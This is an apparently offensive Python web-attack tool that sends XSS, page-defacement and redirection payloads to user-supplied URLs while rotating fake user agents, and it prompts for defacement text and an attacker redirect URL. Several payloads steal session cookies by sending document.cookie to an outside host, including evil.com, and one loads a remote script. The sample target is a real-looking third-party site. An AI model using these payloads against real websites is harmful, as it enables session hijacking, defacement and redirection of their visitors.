import requests
import argparse
from urllib.parse import quote, urljoin
from fake_useragent import UserAgent  # Use fake_useragent
from colorama import Fore

# Initialize the user agent generator using fake_useragent
ua = UserAgent()

# Function to generate a random user agent
def get_random_user_agent():
    return ua.random

# Function to test open redirect vulnerability
def test_open_redirect(base_url, malicious_url, statistics):
    try:
        encoded_url = quote(malicious_url, safe=':/?&=')
        redirect_url = urljoin(base_url, f"?url={encoded_url}")
        
        headers = {'User-Agent': get_random_user_agent()}
        response = requests.get(redirect_url, headers=headers, allow_redirects=False)

        if response.status_code == 302 and 'Location' in response.headers:
            location = response.headers['Location']
            full_location = urljoin(base_url, location)
            if malicious_url in full_location:
                statistics['open_redirects'] += 1
                print("\n" + "-" * 60)
                print(Fore.RED + f"\n[!] Open Redirect Vulnerability Detected!")
                print(Fore.YELLOW + f"Exploit Type: Open Redirect")
                print(Fore.GREEN + f"Exploit Payload: {malicious_url}")
                print(Fore.CYAN + f"Site Affected: {base_url}")
                print(Fore.GREEN + f"Redirect Location: {full_location}")
                print(Fore.GREEN + f"[INFO] Exploited: Redirecting to: {full_location}")
    except requests.exceptions.RequestException as e:
        print(Fore.MAGENTA + f"[Error] Open Redirect test failed: {e}")

# Predefined Style Payloads
def create_style_payloads(background_color, text_color, font_size):
    payloads = []

    # Create background color change payload
    if background_color:
        payloads.append(f"<script>document.body.style.background='{background_color}';</script>")

    # Create text color change payload
    if text_color:
        payloads.append(f"<script>document.body.style.color='{text_color}';</script>")

    # Create font size change payload
    if font_size:
        payloads.append(f"<script>document.body.style.fontSize='{font_size}';</script>")

    return payloads

# Function to generate customizable defacement payloads
def create_defacement_payloads(defacement_text):
    return [
        f"<script>document.body.innerHTML='{defacement_text}';</script>",
        f"<script>document.body.innerHTML='<h1>{defacement_text}</h1>'</script>",
        f"<script>document.body.innerHTML='{defacement_text}';</script>",
        f"<script>document.body.innerHTML='{defacement_text}';</script>"
    ]

# Function to generate customizable redirection payloads
def create_redirection_payloads(redirection_url):
    return [
        f"<script>window.location.replace('{redirection_url}');</script>",
        f"<script>window.location='{redirection_url}';</script>",
        f"<script>location='{redirection_url}'</script>",
        f"<script>window.open('{redirection_url}');</script>",
        f"<script>location.href='{redirection_url}';</script>",
        f"<script>new Image().src='{redirection_url}?cookie='+document.cookie;</script>",
        f"<script>fetch('{redirection_url}/log?cookie='+document.cookie);</script>",
        f"<script>document.body.appendChild(document.createElement('script')).src='{redirection_url}';</script>",
        f"<script>document.location='{redirection_url}';</script>",
        f"<style>body{{background:url('{redirection_url}');}}</style>"
    ]

# Function to test for XSS vulnerabilities with payloads
def test_xss_vulnerabilities(base_url, statistics, query_param):
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<script>document.location='http://evil.com?cookie=' + document.cookie</script>"
    ]

    for payload in xss_payloads:
        try:
            # URL-encode the payload and pass it as a query parameter to simulate the XSS
            encoded_payload = quote(payload, safe='')
            test_url = f"{base_url}?{query_param}={encoded_payload}"  # Inject the payload into query_param
            headers = {'User-Agent': get_random_user_agent()}
            response = requests.get(test_url, headers=headers)
            
            # If the payload is reflected in the response, it means it's vulnerable
            if payload in response.text:
                statistics['xss_found'] += 1
                print("\n" + "-" * 60)
                print(Fore.RED + f"\n[!] Potential XSS Vulnerability Detected!")
                print(Fore.YELLOW + f"Exploit Type: XSS (Cross-Site Scripting)")
                print(Fore.GREEN + f"Exploit Payload: {payload}")
                print(Fore.CYAN + f"Site Affected: {base_url}")
                print(Fore.GREEN + f"[INFO] Exploited: XSS vulnerability triggered successfully!")
            
        except requests.exceptions.RequestException as e:
            print(Fore.MAGENTA + f"[Error] XSS testing failed: {e}")

# Function to handle defacement testing
def test_defacement(base_url, statistics, query_param, defacement_text):
    defacement_payloads = create_defacement_payloads(defacement_text)
    for payload in defacement_payloads:
        try:
            # URL-encode the payload and inject it
            encoded_payload = quote(payload, safe='')
            test_url = f"{base_url}?{query_param}={encoded_payload}"
            headers = {'User-Agent': get_random_user_agent()}
            response = requests.get(test_url, headers=headers)
            
            # If the payload is reflected, this means defacement was triggered
            if payload in response.text:
                statistics['defacements_found'] += 1
                print("\n" + "-" * 60)
                print(Fore.RED + f"\n[!] Defacement Vulnerability Detected!")
                print(Fore.YELLOW + f"Exploit Type: Defacement")
                print(Fore.GREEN + f"Exploit Payload: {payload}")
                print(Fore.CYAN + f"Site Affected: {base_url}")
                print(Fore.GREEN + f"[INFO] Exploited: Defacement successfully triggered!")
        except requests.exceptions.RequestException as e:
            print(Fore.MAGENTA + f"[Error] Defacement test failed: {e}")

# Function to handle redirection testing
def test_redirection(base_url, statistics, query_param, redirection_url):
    redirection_payloads = create_redirection_payloads(redirection_url)
    for payload in redirection_payloads:
        try:
            # URL-encode the payload and inject it
            encoded_payload = quote(payload, safe='')
            test_url = f"{base_url}?{query_param}={encoded_payload}"
            headers = {'User-Agent': get_random_user_agent()}
            response = requests.get(test_url, headers=headers)
            
            # If the payload causes a redirection, it means the site is vulnerable
            if payload in response.text:
                statistics['redirections_found'] += 1
                print("\n" + "-" * 60)
                print(Fore.RED + f"\n[!] Redirection Vulnerability Detected!")
                print(Fore.YELLOW + f"Exploit Type: Redirection")
                print(Fore.GREEN + f"Exploit Payload: {payload}")
                print(Fore.CYAN + f"Site Affected: {base_url}")
                print(Fore.GREEN + f"[INFO] Exploited: Redirection successfully triggered!")
        except requests.exceptions.RequestException as e:
            print(Fore.MAGENTA + f"[Error] Redirection test failed: {e}")

# Function to handle URLs from a file or input
def handle_urls(urls, statistics, background_color, text_color, font_size, query_param, defacement_text, redirection_url):
    for base_url in urls:
        print(Fore.CYAN + f"\n[*] Starting tests for: {base_url}")
        
        # Create style change payloads and inject them
        style_payloads = create_style_payloads(background_color, text_color, font_size)
        
        for payload in style_payloads:
            print(Fore.YELLOW + f"\nInjecting Style Payload: {payload}")
            try:
                headers = {'User-Agent': get_random_user_agent()}
                response = requests.get(base_url, headers=headers, params={query_param: payload})
                if payload in response.text:
                    print(Fore.GREEN + f"Style change payload executed: {payload}")
            except requests.exceptions.RequestException as e:
                print(Fore.MAGENTA + f"[Error] Request failed: {e}")

        # Test for Open Redirect
        test_open_redirect(base_url, "https://rb.gy/tdpzkw", statistics)
        # Test for XSS Vulnerabilities
        test_xss_vulnerabilities(base_url, statistics, query_param)
        # Test for Defacement Vulnerabilities
        test_defacement(base_url, statistics, query_param, defacement_text)
        # Test for Redirection Vulnerabilities
        test_redirection(base_url, statistics, query_param, redirection_url)

    print(Fore.GREEN + f"\n[*] Testing Completed for all URLs.")
    print(Fore.CYAN + f"[INFO] Total Open Redirect Vulnerabilities Found: {statistics['open_redirects']}")
    print(Fore.CYAN + f"[INFO] Total XSS Vulnerabilities Found: {statistics['xss_found']}")
    print(Fore.CYAN + f"[INFO] Total Defacements Found: {statistics['defacements_found']}")
    print(Fore.CYAN + f"[INFO] Total Redirection Found: {statistics['redirections_found']}")

# Main function for testing
def main():
    # Parse arguments
    parser = argparse.ArgumentParser(description="Test for XSS, Defacement, Open Redirect vulnerabilities and apply style changes.")
    parser.add_argument("urls", nargs="?", help="A single URL to test.")
    parser.add_argument("-f", "--file", help="File containing a list of URLs to test.")
    
    # User input for target URL(s)
    target_input = input("Enter a vulnerable URL (e.g., https://www.addel.hu/search.php?searchtext=): ").strip()
    
    if not target_input:
        print(Fore.RED + "[Error] You must provide a valid URL.")
        return
    
    print(Fore.YELLOW + "[INFO] Ensure that the provided URL is vulnerable (e.g., URL with query parameter).")
    
    # User input for optional parameters (if needed)
    file_option = input("Do you want to use a file containing URLs for testing? (y/n): ").strip().lower()
    file_input = None
    
    if file_option == 'y':
        file_input = input("Enter file path: ").strip()
    
    # User input for style changes
    background_color = input("Enter background color (e.g., 'black', 'white'): ")
    text_color = input("Enter text color (e.g., 'red', 'blue'): ")
    font_size = input("Enter font size (e.g., '50px', '100px'): ")
    
    # User input for defacement text and redirection URL
    defacement_text = input("Enter the defacement text (e.g., 'DEFACED BY XYZ'): ")
    redirection_url = input("Enter the redirection URL (e.g., 'https://example.com'): ").strip()

    # Initialize statistics
    statistics = {
        'open_redirects': 0, 
        'xss_found': 0, 
        'defacements_found': 0,
        'redirections_found': 0
    }
    
    # Check if the input is a file or a single URL
    if file_input:
        try:
            with open(file_input, 'r') as file:
                urls = [line.strip() for line in file.readlines()]
            handle_urls(urls, statistics, background_color, text_color, font_size, "searchtext", defacement_text, redirection_url)
        except FileNotFoundError:
            print(Fore.RED + f"[Error] The file {file_input} was not found!")
    else:
        handle_urls([target_input], statistics, background_color, text_color, font_size, "searchtext", defacement_text, redirection_url)

if __name__ == "__main__":
    main()
